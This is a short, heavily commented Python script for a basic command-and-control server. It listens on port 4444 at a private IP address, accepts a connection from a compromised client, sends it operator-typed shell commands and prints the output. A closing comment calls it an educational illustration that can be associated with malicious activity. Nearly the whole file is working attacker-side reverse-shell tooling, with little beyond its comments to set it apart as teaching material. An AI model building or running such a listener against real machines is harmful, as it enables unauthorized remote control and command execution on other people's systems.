#These lines import the sys module for system-related functionalities and the socket module for handling network connections.
import sys
import socket

#The server IP address and port number are set.
# The server will bind to this IP address and listen on the specified port for incoming connections.
server_ip = "192.168.73.109"
port = 4444

#A socket (s) is created, and the setsockopt method is used to set the SO_REUSEADDR option.
#This option allows the reuse of local addresses, which can be helpful in cases where the server needs to be restarted quickly.
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

#The socket is bound to the specified IP address and port number.
s.bind((server_ip,port))

#The socket starts listening for incoming connections, with a maximum backlog of 1 connection.
s.listen(1)

#The script enters a loop to continuously listen for incoming connections. 
# When a client connects, the server prints a message indicating the connection.
while True:
    print(f'[+] listening as {server_ip}:{port}')
    
    client = s.accept()
    print(f'[+] client connected {client[1]}')
    
    #Once the client connects, the server sends a 'connected' message to the client.
    client[0].send('connected'.encode())
    
    #Inside a nested loop, the server waits for user input for a command (cmd).
    # The command is then encoded and sent to the connected client. 
    # If the user enters 'quit', 'exit', 'q', or 'x', the loop is broken.
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())
        
        if cmd.lower() in ['quit','exit','q','x']:
            break
        
        #After sending the command, the server receives the result from the client (limited to 1024 bytes) and prints it to the console.
        result = client[0].recv(1024).decode()
        print(result)
        
    #After handling one client, the server prompts the user to decide whether to wait for a new client (y) or exit the script (n). 
    # If 'n' is entered, the server breaks out of the loop, closing the server socket.
    client[0].close()
    
    cmd = input('wait for new client y/n') or 'y'
    if cmd.lower() in ['n','no']:
        break
#The script closes the server socket, ending the program.    
s.close()

#**Note:**#
#This script is a basic illustration of a command-and-control server, and its use can be associated with malicious activities. 
#The code lacks proper error handling and security measures and is intended for educational purposes only. 
#Unauthorized use of similar code for unauthorized access to systems is illegal and unethical.